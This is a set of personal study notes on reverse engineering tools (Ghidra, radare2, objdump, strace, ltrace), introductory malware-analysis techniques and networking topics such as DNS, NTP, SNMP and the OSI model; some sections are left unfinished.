<pre><code class="language-cpp">long func(long a, long b, long c, long d,
            long e, long f, long g, long h)
{
    long x = a * b * c * d * e * f * g * h;
    long y = a + b + c + d + e + f + g + h;
    long z = otherFunc(x, y);
    return z + 20;
}
</code></pre>
<p><img src="Reverse%20Engineering/Program%20Anatomy/Resources/Images/stackframe.png" alt="" /></p>
<p>Sometimes, the base pointer might be completely absent in optimised programs because compilers are good enough in keeping track of offsets directly from the stack pointer.</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="introduction-21"><a class="header" href="#introduction-21">Introduction</a></h1>
<p>Ghidra is an open-source framework for reverse engineering developed by the NSA. It groups binaries into <em>projects</em> which can be shared amonst multiple people.</p>
<h1 id="installation"><a class="header" href="#installation">Installation</a></h1>
<p>To install Ghidra, you can run <code>sudo apt install ghidra</code>.</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="creating-a-project"><a class="header" href="#creating-a-project">Creating a Project</a></h1>
<ul>
<li>File -&gt; New Project
<ul>
<li>Non-Shared Project</li>
<li>Select Directory</li>
<li>Name the Project</li>
</ul>
</li>
</ul>
<p><img src="Reverse%20Engineering/Reverse%20Engineering%20with%20Ghidra/Resources/Images/create-project.png" alt="" /></p>
<h1 id="loading-a-binary"><a class="header" href="#loading-a-binary">Loading a Binary</a></h1>
<ul>
<li>
<p>File -&gt; Import File</p>
<p><img src="Reverse%20Engineering/Reverse%20Engineering%20with%20Ghidra/Resources/Images/import-file.png" alt="" /></p>
<ul>
<li>
<p>Select the binary you want to import</p>
</li>
<li>
<p>Ghidra will automatically detect certain information about the file</p>
<p><img src="Reverse%20Engineering/Reverse%20Engineering%20with%20Ghidra/Resources/Images/file-info-import.png" alt="" /></p>
</li>
<li>
<p>After importing, Ghidra will display an Import Results Summary containing information about the binary</p>
<p><img src="Reverse%20Engineering/Reverse%20Engineering%20with%20Ghidra/Resources/Images/Pasted%20image%2020211112104550.png" alt="" /></p>
</li>
</ul>
</li>
</ul>
<div style="break-before: page; page-break-before: always;"></div><h1 id="initial-analysis"><a class="header" href="#initial-analysis">Initial Analysis</a></h1>
<p>Double-clicking on a program will open it in the Code Browser. A prompt will appear for analysing the binary. Ghidra will attempt to create and label functions, as well as identify any cross-references in memory. Once the binary has been analysed you will be presented with the following screen:</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="introduction-22"><a class="header" href="#introduction-22">Introduction</a></h1>
<p><code>radare2</code> is an open-source framework for reverse engineering. The framework includes multiple tools which all work in tandem in order to aid in the analysis of binary files. </p>
<p>It uses short abbreviations for its commands - single letters - and many of its commands have subcommands which are also expressed as single letters. Luckily, you can always append a <code>?</code> to a specific command in order to view its subcommands and what they do.</p>
<p>To quit <code>radare2</code>, use the <code>q</code> command.</p>
<h1 id="loading-a-binary-1"><a class="header" href="#loading-a-binary-1">Loading a Binary</a></h1>
<p>You can load a binary by invoking the <code>r2</code> command. You might sometimes need to also add the <code>-e io.cache=true</code> option in order to fix relocations in disassembly.</p>
<p><img src="Reverse%20Engineering/Reverse%20Engineering%20with%20radare2/Resources/Images/load-binary.png" alt="" /></p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="analysis"><a class="header" href="#analysis">Analysis</a></h1>
<ul>
<li><code>aaa</code> - analyse the binary
<img src="Reverse%20Engineering/Reverse%20Engineering%20with%20radare2/Resources/Images/aaa.png" alt="" />
<ul>
<li><code>afl</code> - list the analysed functions
<img src="Reverse%20Engineering/Reverse%20Engineering%20with%20radare2/Resources/Images/afl.png" alt="" /></li>
<li><code>axt &lt;function&gt;</code> - list all the places where a function is called. Note, you need to use the flag name that redare automatically creates for funtions after <code>aaa</code>.
<img src="Reverse%20Engineering/Reverse%20Engineering%20with%20radare2/Resources/Images/axt.png" alt="" /></li>
</ul>
</li>
</ul>
<div style="break-before: page; page-break-before: always;"></div><h1 id="binary-info"><a class="header" href="#binary-info">Binary Info</a></h1>
<ul>
<li>
<p><code>i</code> - display file information</p>
<p><img src="Reverse%20Engineering/Reverse%20Engineering%20with%20radare2/Resources/Images/file-metadata.png" alt="" /></p>
<ul>
<li>
<p><code>ie</code> - find the program's entry point</p>
<p><img src="Reverse%20Engineering/Reverse%20Engineering%20with%20radare2/Resources/Images/entry-point.png" alt="" /></p>
</li>
<li>
<p><code>iM</code> - find the program's main function</p>
<p><img src="Reverse%20Engineering/Reverse%20Engineering%20with%20radare2/Resources/Images/main-function.png" alt="" /></p>
</li>
<li>
<p><code>iz</code> - pull the hard-coded strings from the executable (only the data sections), use <code>izz</code> to get the strings from the entire binary</p>
<p><img src="Reverse%20Engineering/Reverse%20Engineering%20with%20radare2/Resources/Images/pull-strings.png" alt="" /></p>
</li>
</ul>
</li>
</ul>
<div style="break-before: page; page-break-before: always;"></div><h1 id="flags"><a class="header" href="#flags">Flags</a></h1>
<p>Flags resemble bookmarks. They associate a name with a given offset in a file.</p>
<p>Create a new flag</p>
<pre><code>f &lt;name&gt; @ offset
</code></pre>
<p>You can also remove a flag by appending <code>-</code> to the command:</p>
<pre><code>f-&lt;name&gt;
</code></pre>
<p>List available flags - <code>f</code>:</p>
<p><img src="Reverse%20Engineering/Reverse%20Engineering%20with%20radare2/Resources/Images/list-flags.png" alt="" /></p>
<p>Rename a flag</p>
<pre><code>fr &lt;old name&gt; &lt;new name&gt;
</code></pre>
<h2 id="local-flags"><a class="header" href="#local-flags">Local Flags</a></h2>
<p>Flag names should be unique for addressing reasons. However, it is often the case that you need to have simple and ubiquitous names like <code>loop</code> or <code>return</code>. For this purpose exist the so-called &quot;local&quot; flags, which are tied to the function where they reside. It is possible to add them using <code>f.</code> command:</p>
<h1 id="flag-spaces"><a class="header" href="#flag-spaces">Flag Spaces</a></h1>
<p>Flags can be grouped into flag spaces - is a namespace for flags, grouping together similar flags. Some flag spaces include sections, registers, symbols. These are managed with the <code>fs</code> command.</p>
<pre><code class="language-bash">[0x00001080]&gt; fs?
Usage: fs [*] [+-][flagspace|addr]   # Manage flagspaces
| fs            display flagspaces
| fs*           display flagspaces as r2 commands
| fsj           display flagspaces in JSON
| fs *          select all flagspaces
| fs flagspace  select flagspace or create if it doesn't exist
| fs-flagspace  remove flagspace
| fs-*          remove all flagspaces
| fs+foo        push previous flagspace and set
| fs-           pop to the previous flagspace
| fs-.          remove the current flagspace
| fsq           list flagspaces in quiet mode
| fsm [addr]    move flags at given address to the current flagspace
| fss           display flagspaces stack
| fss*          display flagspaces stack in r2 commands
| fssj          display flagspaces stack in JSON
| fsr newname   rename selected flagspace
</code></pre>
<div style="break-before: page; page-break-before: always;"></div><h1 id="seeking"><a class="header" href="#seeking">Seeking</a></h1>
<p>Moving around the file requires the usage of the seek (<code>s</code>) command in order to change the offset at which we are. It takes one argument which is a mathematical expression capable of containing flag names, parenthesis, addition, substraction, multiplication of immediates of contents of memory using brackets. Examples:</p>
<pre><code>[0x00000000]&gt; s 0x10
[0x00000010]&gt; s+4
[0x00000014]&gt; s-
[0x00000010]&gt; s+
[0x00000014]&gt;
</code></pre>
<p>Here is a list of additional seeking commands:</p>
<pre><code>[0x00000000]&gt; s?
Usage: s    # Help for the seek commands. See ?\\( ? to see all variables
| s                 Print current address
| s.hexoff          Seek honoring a base from core-&gt;offset
| s:pad             Print current address with N padded zeros (defaults to 8)
| s addr            Seek to address
| s-                Undo seek
| s-*               Reset undo seek history
| s- n              Seek n bytes backward
| s--[n]            Seek blocksize bytes backward (/=n)
| s+                Redo seek
| s+ n              Seek n bytes forward
| s++[n]            Seek blocksize bytes forward (/=n)
| s[j*=!]           List undo seek history (JSON, =list, *r2, !=names, s==)
| s/ DATA           Search for next occurrence of 'DATA'
| s/x 9091          Search for next occurrence of \x90\x91
| sa [[+-]a] [asz]  Seek asz (or bsize) aligned to addr
| sb                Seek aligned to bb start
| sC[?] string      Seek to comment matching given string
| sf                Seek to next function (f-&gt;addr+f-&gt;size)
| sf function       Seek to address of specified function
| sf.               Seek to the beginning of current function
| sg/sG             Seek begin (sg) or end (sG) of section or file
| sl[?] [+-]line    Seek to line
| sn/sp ([nkey])    Seek to next/prev location, as specified by scr.nkey
| so [N]            Seek to N next opcode(s)
| sr pc             Seek to register
| ss                Seek silently (without adding an entry to the seek history)

&gt; 3s++        ; 3 times block-seeking
&gt; s 10+0x80   ; seek at 0x80+10

</code></pre>
<div style="break-before: page; page-break-before: always;"></div><h1 id="strings"><a class="header" href="#strings">Strings</a></h1>
<ul>
<li><code>/ &lt;string&gt;</code> - search the bytes of the binary for a specific string
<img src="Reverse%20Engineering/Reverse%20Engineering%20with%20radare2/Resources/Images/search-bytes-basic.png" alt="" />
<ul>
<li><code>/w &lt;string&gt;</code> - search for wide character strings like Unicode symbols</li>
</ul>
</li>
</ul>
<div style="break-before: page; page-break-before: always;"></div><h1 id="introduction-23"><a class="header" href="#introduction-23">Introduction</a></h1>
<p>Source code gets compiled to assembly and then assembly gets compiled to machine code. Assembly has a direct one-to-one mapping of its instructions to those in machine language. This makes assembly the only possible way to disambiguously take a look at what a program does. Assembly is essentially a human readable version of machine code.</p>
<h2 id="intel-vs-att-syntax"><a class="header" href="#intel-vs-att-syntax">Intel vs AT&amp;T Syntax</a></h2>
<p>There are two general syntax formats for writing Assembly - Intel and AT&amp;T. I will be using Intel throughout my notes, but here is a list of common differences between the two because you never know which one you might have to read:</p>
<h3 id="intel"><a class="header" href="#intel">Intel</a></h3>
<ul>
<li>Instruction format - <code>operation destination, source</code></li>
<li>Instruction sufixes - none</li>
<li>Register &amp; Immediate value prefixes - none</li>
<li>Dereferencing - done with <code>[]</code></li>
</ul>
<h3 id="att"><a class="header" href="#att">AT&amp;T</a></h3>
<ul>
<li>Instruction format - <code>operation source, destination</code></li>
<li>Mnemonic sufixes - mnemonics have a suffix depending on the size of their operands - <code>b</code> for byte, <code>w</code> for word, <code>l</code> long
<pre><code>movb %bl,%al
movw %bx,%ax
movl  %ebx,%eax
movl (%ebx),%eax
</code></pre>
</li>
<li>Register &amp; Immediate value prefixes - registers are prefixed with <code>%</code> and immediate values with <code>\\( </code></li>
<li>Dereferencing - done with <code>()</code></li>
</ul>
<div style="break-before: page; page-break-before: always;"></div><h1 id="reverse-engineering-with-objdump"><a class="header" href="#reverse-engineering-with-objdump">Reverse Engineering with objdump</a></h1>
<p><code>objdump</code> is a program for displaying information from binaries. It can be used for showing different aspects of the object file. By default, it generates AT&amp;T assembly, but you can change this with the <code>-M intel</code> option.</p>
<ul>
<li>
<p>disassemble everything - <code>-D</code></p>
<pre><code>objdump -D &lt;binary&gt; -M intel
</code></pre>
<p><img src="Reverse%20Engineering/Resources/Images/objdump-basic.png" alt="" /></p>
</li>
<li>
<p>display sections headers - <code>-h</code></p>
<pre><code>objdump -h &lt;binary&gt;
</code></pre>
<p><img src="Reverse%20Engineering/Resources/Images/objdump-section-headers.png" alt="" /></p>
</li>
<li>
<p>print private headers - <code>-p</code></p>
<pre><code>objdump -p &lt;binary&gt;
</code></pre>
<p>Note the flags on the private headers. If the <code>x</code> flag is on, then that section is executable.</p>
<p><img src="Reverse%20Engineering/Resources/Images/objdump-private-headers.png" alt="" /></p>
</li>
</ul>
<h1 id="tracing-syscalls-with-strace"><a class="header" href="#tracing-syscalls-with-strace">Tracing syscalls with strace</a></h1>
<p><code>strace</code> is a program for tracing what system calls a binary issues during runtime. It can be used with the following basic syntax:</p>
<pre><code>strace &lt;binary&gt;
</code></pre>
<p>Note, that if the binary is in your current working directory, you will need to prepend <code>./</code> to its name because <code>strace</code> works with processes and not the actual stored binary.</p>
<p><img src="Reverse%20Engineering/Resources/Images/strace-basic.png" alt="" /></p>
<h1 id="tracing-library-calls-with-ltrace"><a class="header" href="#tracing-library-calls-with-ltrace">Tracing library calls with ltrace</a></h1>
<p><code>ltrace</code> is rather similar to <code>strace</code>, but instead of system calls, it traces calls to functions in certain libraries. The syntax for it isn't unlike that for <code>strace</code>.</p>
<pre><code>ltrace &lt;binary&gt;
</code></pre>
<p>Note, that if the binary is in your current working directory, you will need to prepend <code>./</code> to its name because <code>ltrace</code> works with processes and not the actual stored binary.</p>
<p><img src="Reverse%20Engineering/Resources/Images/ltrace-basic.png" alt="" /></p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="1-goals-of-malware-analysis"><a class="header" href="#1-goals-of-malware-analysis">1. Goals of Malware Analysis</a></h1>
<p>Malware analysis serves the purpose of providing the information needed to respond to a network intrusion. You will typically need to determine what took place and make sure that you have identified all of the infected machines and files. In analyzing suspected malware, you will seek to determine exactly what it does, how it can be detected on a network, and how to measure and contain its damage.</p>
<ul>
<li><em>host-based signatures</em> - also known as indicators, are used to detect malicious code on victim computers. These often identify files created and/or modified by the malware or specific changes it makes to the registry. Unlike antivirus signatures, malware indicators focus on what the malware does to a system and not on what its characteristics are. Hence why they are better at detected malware which mutates or has been erased from the hard disk.</li>
<li><em>network singnatures</em> - they detect malware by analyzing network traffic.</li>
</ul>
<h1 id="2-malware-analysis-techniques"><a class="header" href="#2-malware-analysis-techniques">2. Malware Analysis Techniques</a></h1>
<ul>
<li>Basic Static Analysis - examining the executable without looking at the actual instructions. It can provide confirmation of whether a file is malicious, information about its functionality, and information for producing network signatures. It is straightforward and often quick, but rather ineffective against sophisticated malware.</li>
<li>Basic Dynamic Analysis - running the malware and examining its behaviour in order to remove it from the system, produce effective signatures, or both. It requires an environment to run the malware without affecting your host system or network.</li>
<li>Advanced Static Analysis - reverse-engineering the malware by loading the executable into a disassembler and examining the program instructions in order to piece together what the program does.</li>
<li>Advanced Dyanamic Analysis - using a debugger to look at the internal state of the malicious code at runtime. </li>
</ul>
<h1 id="3-types-of-malware"><a class="header" href="#3-types-of-malware">3. Types of malware</a></h1>
<ul>
<li>to be finished</li>
</ul>
<div style="break-before: page; page-break-before: always;"></div><h1 id="1-antivirus-scanning"><a class="header" href="#1-antivirus-scanning">1. Antivirus Scanning</a></h1>
<p>A good first step when analyzing possible malware is to scan it with multiple antivirus programs, which may already have identified the malicious code. However, AV tools are not perfect. The are reliant on a database which contains <em>file signatures</em> - identifiable pieces of known malicious code, and on <em>heuristics</em> - the analysis of behaviour combined with pattern-matching. Rare and modified malware can easily evade AV detection simply because it is not contained its database.</p>
<p>One should run several different antivirus programs against the prospective malicious code, since different AVs use different signatures and heuristics. As such, websites like <a href="https://www.virustotal.com/">VirusTotal</a> can prove very useful in these situations - they allow you to upload files to be scanned by multiple antivirus engines.</p>
<h1 id="2-hashing"><a class="header" href="#2-hashing">2. Hashing</a></h1>
<p>Hashing is a method commonly used for uniquely identifying malware. It can serve as a sort of <em>fingerprint</em> for the malicious code. The Message-Digest Algorithm 5 (MD5) is often used for this purpose, however, the Secure Hash Algorithm 1 (SHA-1) is also popular.</p>
<p>On Windows, one can generate such a hash by using <code>CertUtil</code>:</p>
<p><img src="Malware%20Analysis/Resources/Images/CertUtil-md5sum.png" alt="" /></p>
<p>On Linux, the <code>md5sum</code> command is usually available:</p>
<p><img src="Malware%20Analysis/Resources/Images/Linux-md5sum.png" alt="" /></p>
<p>Once you have a unique hash for some malware, you can use it in the following ways:</p>
<ul>
<li>using the hash as a label</li>
<li>sharing the hash with other analysts to help them identify the malware</li>
<li>look up the hash online to see if it has been previously identified</li>
</ul>
<p><em>It is recommended to use <code>sha256sum</code> when you identify malware because md5sum is vulnerable to collision attacks.</em></p>
<h1 id="3-finding-strings"><a class="header" href="#3-finding-strings">3. Finding Strings</a></h1>
<p>A <em>string</em> is a sequence of characters. A program may contain many different strings - printing a message, connecting to URLs, accessing file locations, etc. Searching through the strings in a program can give hints about its functionality.  If a program creates or modifies a specific file, you will be able to see the string of the file location in the program. The <a href="https://docs.microsoft.com/en-us/sysinternals/downloads/strings">Strings</a> command can be used to seach a binary for strings that are usually stored in ASCII or Unicode format:</p>
<p><img src="Malware%20Analysis/Resources/Images/Strings.png" alt="" /></p>
<p><em>Note: I haven't used actual malicious code, but instead a little program that I created.</em> </p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="networking"><a class="header" href="#networking">Networking</a></h1>
<p>Computer networking refers to the study, management, and orginisation of computer networks.</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="dns-1"><a class="header" href="#dns-1">DNS</a></h1>
<div style="break-before: page; page-break-before: always;"></div><div style="break-before: page; page-break-before: always;"></div><h1 id="introduction-24"><a class="header" href="#introduction-24">Introduction</a></h1>
<p>Computers connected to the Internet have a numerical identifier - called an Internet Protocol Address (IP Address) - which is used to communicate with this machine. However, remembering a 32-bit number for each computer you want to connect to - even if it's formatted nicely into four separate sections - isn't practical at all. As such, a systematic way of resolving this issue was a created - a sort of lookup table for IP addresses, known as the Domain Name System.</p>
<h1 id="what-is-the-dns"><a class="header" href="#what-is-the-dns">What is the DNS?</a></h1>
<p>The Domain Name System (or DNS for short) is a decentrialised database which provides answers to queries for <em>domain names</em>. Such a query is for example &quot;What is the IP address of google.com? &quot; When such a request is sent out, it will go through the DNS and eventually return with an IP address (if such was found). This saves the average user from having to remember a myriad different IPs for each website they want to visit.</p>
<h1 id="the-dns-hierarchy"><a class="header" href="#the-dns-hierarchy">The DNS Hierarchy</a></h1>
<p>The DNS utilises a hierarchical structure for both storing and serving requested information.</p>
<p><img src="Networking/DNS/../Resources/Images/DNSHierarchy.png" alt="" /></p>
<p>At the top of the hierarchy are positioned the root name servers. These store and serve information about the top-level domains (TLDs) such as <code>.net</code>, <code>.com</code>, and <code>.org</code>. The TLD servers provide information about domains which use their corresponding TLD - <code>.com</code> servers contain information about domains such as <code>google.com</code> or <code>duckduckgo.com</code>. They won't give you the IP addresses for these hosts, but will instead point you in the right direction - to another DNS server. </p>
<p>The DNS can be thought of as a file system - one where the addresses are read from right to left and instead of forwards slashes, dots are used. The root is represented by a single dot (.), which is usually not visible. Next follow the top-level domains - similar to directories. Going further, we get second level domains and then subdomains, followed by hosts.</p>
<h1 id="dissecting-a-basic-dns-query"><a class="header" href="#dissecting-a-basic-dns-query">Dissecting a Basic DNS Query</a></h1>
<p>Typing a domain name - such as <code>google.com</code> - into your browser will cause your operating system to attempt to resolve that domain name, or in other words - determine its IP address. It will first check locally for an answer as this is the fastest option. It will look into the local cache and the <code>/etc/hosts</code> file (on UNIX-like system, or <code>C:\Windows\System32\drivers\etc\hosts</code> on Windows). If an answer is not found, the DNS request will be forwarded to your DNS server, which will usually be your home router. Your DNS server may have the answer cached because someone on your network recently queried the same domain. If not, the DNS server will contain an IP address for another name server where you can forward your request - for example the DNS server at your ISP. It's very unlikely that your ISP's name server won't have a cached answer, given the amount of queries that constantly go through it. However, if this happens to be the case, the ISP's name server will carry out further requests on your behalf - exactly how your router forwards the query to your ISP's name server. Name servers can be configured to perform such lookups recursively or not. </p>
<p>If your ISP's name server does not know the IP for the server responsible for <code>.com</code> domains, it will ask one of the 13 root name servers, which are designated with the letters A through M). In reality, there are more than 13 physical machines handling these requests. More information about the root name servers you can find <a href="https://www.iana.org/domains/root/servers">here</a>.</p>
<p>This process will continue until you are forwarded to the name server responsible for the domain you are looking for. This name server will provide you with the IP address of your desired domain, which will be cached, allowing quicker access later.</p>
<h1 id="zones-and-authority"><a class="header" href="#zones-and-authority">Zones and Authority</a></h1>
<p>Some name servers are authoritative in a particular subsection of the DNS - they answer queries only for domains in a particular space. Only one name server, known as the <em>Start of Authority (SOA)</em> could give a decisive answer for a particular query. Other name servers may have the answer cached, but only if they have previously requested it in the span of the time-to-live (TTL).</p>
<p>For example, the SOA for <code>google.com</code> is only responsible for domains in the <code>google.com</code> space. The spaces or <em>name spaces</em> within the DNS are usually referred to as <em>zones of authority</em> or simply <em>zones</em>.
In reality, there is usually more than a single name server for a big company like Google, however, they both do the same job and are considered the SOA. Their names usually go ns1, ns2, and so forth. Should one name server go offline, the next one would take its place in processing queries.</p>
<h1 id="dns-resource-records"><a class="header" href="#dns-resource-records">DNS Resource Records</a></h1>
<p>I already mentioned that the DNS is similar to a database - one split up and stored around the globe. The entries in this database are called <em>resource records</em> and are usually stored in a flat-file format. Resource records do not only store IP addresses and hostnames - they contain other useful information, as well. These are the most common different types of resource records (a complete list can be found <a href="https://en.wikipedia.org/wiki/List_of_DNS_record_types">here</a>):</p>
<ul>
<li><strong>Address of Host (A)</strong> - the IPv4 address of the host</li>
<li><strong>Address of Host (AAAA)</strong> - the IPv6 address of the host</li>
<li><strong>Canonical Name (CNAME)</strong> - also an alias; two domains might point to the same place, in which case, one would be an alias. Querying the domain in this server will result in the A record.</li>
<li><strong>Mail Exchanger (MX)</strong> - refers to a mail server and can contain either an IP address or a hostname</li>
<li><strong>Name Server (NS)</strong> - contains the name server information for a given zone</li>
<li><strong>Start of Authority (SOA)</strong> - found at the beginning of every zone file, this record is bigger than others and stores the primary name server for the zone, including some other information</li>
<li><strong>Pointer (PTR)</strong> - used for reverse DNS lookups - finding the hostname by providing an IP address</li>
<li><strong>Text (TXT)</strong> - a simple text record used for adding extra functionality to DNS and storing miscellaneous information. Sometimes used by administrators for leaving humand-readable notes.</li>
</ul>
<div style="break-before: page; page-break-before: always;"></div><p>This is a special domain used for reverse DNS lookups. In the <code>in-addr.arpa</code> domain, IP addresses are represented as a sequence of four decimal numbers separated by dots. The suffix of <code>in-addr.arpa</code> is appended to the IP address. In this domain, however, IP address octets are read from right to left, but the contents of the octets are not. For example, in order to do a reverse lookup on <code>172.217.169.174</code>, you would use <code>174.169.217.172.in-addr.arpa</code>. This domain is used for reverse lookups on IPv4 addresses. </p>
<p>For IPv6 addresses, the <code>ip6.arpa</code> domain is used. The address is represented by hex digits in reverse order - each digit looking like a domain name. For example, to do a reverse look up on <code>2001:db8::567:89ab</code>, you would use <code>b.a.9.8.7.6.5.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.8.b.d.0.1.0.0.2.ip6.arpa</code>.</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="introduction-25"><a class="header" href="#introduction-25">Introduction</a></h1>
<p>A computer network is a network which allows for the exchange of resources and information between devies connected to the network. These device span a range of types, sizes, and functions. </p>
<h1 id="network-devices"><a class="header" href="#network-devices">Network Devices</a></h1>
<h2 id="switch"><a class="header" href="#switch">Switch</a></h2>
<div style="break-before: page; page-break-before: always;"></div><h1 id="introduction-26"><a class="header" href="#introduction-26">Introduction</a></h1>
<div style="break-before: page; page-break-before: always;"></div><h1 id="introduction-27"><a class="header" href="#introduction-27">Introduction</a></h1>
<p>The <strong>N</strong>etwork <strong>T</strong>ime <strong>P</strong>rotocol (NTP) is a protocol for clock synchronisation across computer systems. Its existence is paramount in order to pinpoint events occurring at a certain moment within a network. Devices with unsynchronised clocks will report that the event transpired at different times thus making it very difficult to figure out the actual time of occurrence.</p>
<p>This protocol works over UDP on port 123.</p>
<h1 id="how-does-ntp-work"><a class="header" href="#how-does-ntp-work">How does NTP work?</a></h1>
<p>NTP utilises a hierarchy system. Each clock is assigned a <em>stratum</em>. Stratum values range between 0 and 15, with a value of 16 denoting an unsynchronised clock. Devices of Stratum 0 are called reference clocks and these are one of the most accurate time-keeping machines such as atomic clocks. The stratum value, therefore, represents the distance from the reference clock or how accurate a given clock is in comparison to a device of Stratum 0. Every new layer adds a 1 to the stratum value.</p>
<p>Reference clocks are not directly connected to the network. Instead, the so-called <em>primary time servers</em> connect to the reference clock and synchronise their clocks with it. These servers have a stratum value of 1. For each layer you go down the chain, the stratum value increases by 1, since the distance from the reference clocks augments.</p>
<p><img src="Networking/Protocols/Resources/Images/NTP_Hierarchy.png" alt="" /></p>
<h1 id="synchronising-time-on-linux-with-ntpdate"><a class="header" href="#synchronising-time-on-linux-with-ntpdate">Synchronising time on Linux with <code>ntpdate</code></a></h1>
<p><code>ntpdate</code> is a useful utility for synching time on Linux machines through NTP. It's syntax is really simple:</p>
<p><code>ntpdate [server]</code></p>
<p>In order to set the date, it requires root privileges:</p>
<p><img src="Networking/Protocols/Resources/Images/NTP_wrong_time.png" alt="" /></p>
<p>Synching the time with a Windows machine on my network:</p>
<p><img src="Networking/Protocols/Resources/Images/NTP_synch.png" alt="" /></p>
<p>New time:</p>
<p><img src="Networking/Protocols/Resources/Images/NTP_synched_time.png" alt="" /></p>
<p>It can also be useful to only check how unsynched your time is with respect to another clock. You can do this by adding the <code>-q</code> option. This does not require root privileges.</p>
<p><img src="Networking/Protocols/Resources/Images/NTP_time_query.png" alt="" /></p>
<p>That's quite the difference! </p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="introduction-28"><a class="header" href="#introduction-28">Introduction</a></h1>
<p>SNMP is a protocol which renders the service of providing monitoring of devices connected to a network. It can provide information such as online status, network bandwith, and even temperature.</p>
<p>This protocol works over UDP on port 161.</p>
<h1 id="agents"><a class="header" href="#agents">Agents</a></h1>
<p>Devices which are SNMP enabled are called <em>agents</em>. The monitored devices are known as <em>managed devices</em>, whilst the SNMP &quot;server&quot; is called the Network Management Station (NMS). The latter is responsible for gathering and organising the information it receives from the managed devices.</p>
<h1 id="objects"><a class="header" href="#objects">Objects</a></h1>
<p>Each agent has <em>objects</em>, some of which are standardised and others which are vendor specific. For example, a router might have name, uptime, interfaces, and routing table. Each object is assigned an <em>object identifier</em> (OID), which is a sequence of numbers separated by periods and resembling an IP address. OIDs are used for the identification of an object and are collectively stored in a Management Information Base (MIB) file.</p>
<h1 id="management-information-base-mib"><a class="header" href="#management-information-base-mib">Management Information Base (MIB)</a></h1>
<p>The MIB has follows a tree hierarchy and objects are organised in layers. Each layer is assigned a number and separated by a period in the OID, so in a sense, the OID is like a set of instructions how to get from the top of the tree to the desired object. Every agent is associated with a particular MIB.</p>
<h1 id="communicating-over-snmp"><a class="header" href="#communicating-over-snmp">Communicating over SNMP</a></h1>
<p>Three main ways of communication exist within SNMP:</p>
<ol>
<li>The NMS can query the managed devices about their current status.</li>
<li>The NMS can order managed devices to alter aspects of their configuration.</li>
<li>Managed devices can send messages to the NMS when certain events occur, such as an interface going down.</li>
</ol>
<h2 id="get-requests"><a class="header" href="#get-requests"><code>Get</code> Requests</a></h2>
<p>When the NMS wants to know about a specific object of an agent, it sends a <code>Get</code> request. These include <code>Get</code>, <code>GetNext</code>, and <code>GetBulk</code>. The agent then gives a <code>Get</code> response.</p>
<p><img src="Networking/Protocols/Resources/Images/SNMP_Get_request.png" alt="" /></p>
<h2 id="set-requests"><a class="header" href="#set-requests"><code>Set</code> Requests</a></h2>
<p><code>Set</code> requests are issued by the NMS, when it wants a certain agent to make a change to one of its objects.</p>
<h2 id="trap-and-inform"><a class="header" href="#trap-and-inform"><code>Trap</code> and <code>Inform</code></a></h2>
<p>These are used by agents when they want to inform the NMS of something such as the occurrence of a critical event.</p>
<p><img src="Networking/Protocols/Resources/Images/SNMP_trap_inform.png" alt="" /></p>
<p>Although they serve the same purpose, <code>Trap</code> and <code>Inform</code> messages are different. The latter is reliable - it waits for acknowledgement from the NMS. Should it not receive one, the <code>Inform</code> message would be resent.</p>
<h2 id="community-strings"><a class="header" href="#community-strings">Community strings</a></h2>
<p>SNMP versions 1 and 2 avail themselves of the so-called <em>community strings</em>. It is important to know that agents reply to SNMP requests only if they are accompanied by the appropriate community string, which is akin to a password. Every community string is associated with a set of permissions. These can be either read-only or read-write.</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="network-address-translation"><a class="header" href="#network-address-translation">Network Address Translation</a></h1>
<p><img src="https://66.media.tumblr.com/02a533c1d55ca0ba83e0176168df06ec/tumblr_inline_o4m1taQugo1u4ytoo_1280.jpg" alt="Private Ip Addresses Photos on the Web" /></p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="introduction-29"><a class="header" href="#introduction-29">Introduction</a></h1>
<p>The OSI model is a conceptual protocol model which groups different protocols into <em>layers</em>, based on their function. Each layer is in turn only allowed to communicate with the layers immediately above and below it, taking data from the previous layer, processing it in some way and then forwarding it to the next layer. There are 7 layers in the OSI model and together they form the layer stack:</p>
<p><img src="Networking/Resources/Images/OSI_Layers.png" alt="" /></p>
<p>When data is sent from a device, this data is processed in each layer from top to bottom. Furthermore, each layer may augment the actual data transmitted by adding <em>headers</em> to the data.</p>
<p>At the site of arrival, data processing occurs in the reverse order. Each layer processes the corresponding header and acts upon it. Once it's done with its job, it forwards the remaining information up to the above layer. It's just like peeling an onion!</p>
<p><img src="Networking/Resources/Images/OSI_Data_flow.png" alt="" /></p>
<h1 id="the-application-layer"><a class="header" href="#the-application-layer">The Application Layer</a></h1>
<p>Here reside the myriad network applications and their application-layer protocols, such as HTTP, FTP, and SMTP. These are all tailored to the network application and serve very specific purposes. It is relatively easy to also develop and implement your own application-layer protocols. Pakcets of information at this layer are referred to as <em>messages</em>.</p>
<h1 id="the-presentation-layer"><a class="header" href="#the-presentation-layer">The Presentation layer</a></h1>
<p>The presentation layer is responsible for formatting and rendering data into an appropriate format. It handles data compression and decompression, encryption and decryption. Furthemore, it deals with the cross-OS compatibility of data. In other words, it describes how data should be <em>presented</em> to the application layer.</p>
<h1 id="the-session-layer"><a class="header" href="#the-session-layer">The Session Layer</a></h1>
<p>The session layer sets up, maintains, synchronises, and terminates the communication between different hosts. It includes functionality for user logon, authentication, management and logoff. Common protocols are ADSP, PPTP, and PAP.</p>
<h1 id="the-transport-layer"><a class="header" href="#the-transport-layer">The Transport Layer</a></h1>
<p>This layer provides the means through which messages are transmitted between endpoints. It provides services for addressing, message delivery, flow control and multiplexing. The two protocols which dominate this layer are TCP and UDP. Packets at this layer are known as <em>segments</em>.</p>
<h1 id="the-network-layer"><a class="header" href="#the-network-layer">The Network Layer</a></h1>
<p>Network-layer packets are called <em>datagrams</em> and this layer is responsible for moving these datagrams from host to host. It is provided with a source and destination address from the transport layer and then send the datagram on its path to the destination. Here resides the famous IP protocol, together with different routing protocols such as ICMP and DDP.</p>
<h1 id="the-data-link-layer"><a class="header" href="#the-data-link-layer">The Data Link Layer</a></h1>
